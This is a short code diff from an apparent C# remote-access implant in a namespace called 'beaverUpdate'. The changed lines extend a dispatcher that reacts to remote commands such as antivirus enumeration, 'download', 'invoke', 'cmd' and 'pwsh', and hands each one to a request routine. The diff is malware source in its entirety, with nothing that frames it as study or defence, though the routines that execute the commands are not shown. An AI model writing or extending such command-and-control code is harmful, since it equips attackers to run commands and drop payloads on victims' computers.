@@ -89,12 +89,22 @@ namespace beaverUpdate
                                         // Execute async task for command3
                                         await Task.Run(() => SendRequest("enumAV"));
                                     }
-                                    else if (receivedText.Contains("DownExec"))
+                                    else if (receivedText.Contains("download"))
                                     {
                                         Console.WriteLine($"Received: {receivedText}");
                                         await Task.Run(() => SendRequest(receivedText));
                                     }
-                                    else if (receivedText.Contains("chaos"))
+                                    else if (receivedText.Contains("invoke"))
+                                    {
+                                        Console.WriteLine($"Received: {receivedText}");
+                                        await Task.Run(() => SendRequest(receivedText));
+                                    }
+                                    else if (receivedText.Contains("cmd"))
+                                    {
+                                        Console.WriteLine($"Received: {receivedText}");
+                                        await Task.Run(() => SendRequest(receivedText));
+                                    }
+                                    else if (receivedText.Contains("pwsh"))
                                     {
                                         Console.WriteLine($"Received: {receivedText}");
                                         await Task.Run(() => SendRequest(receivedText));
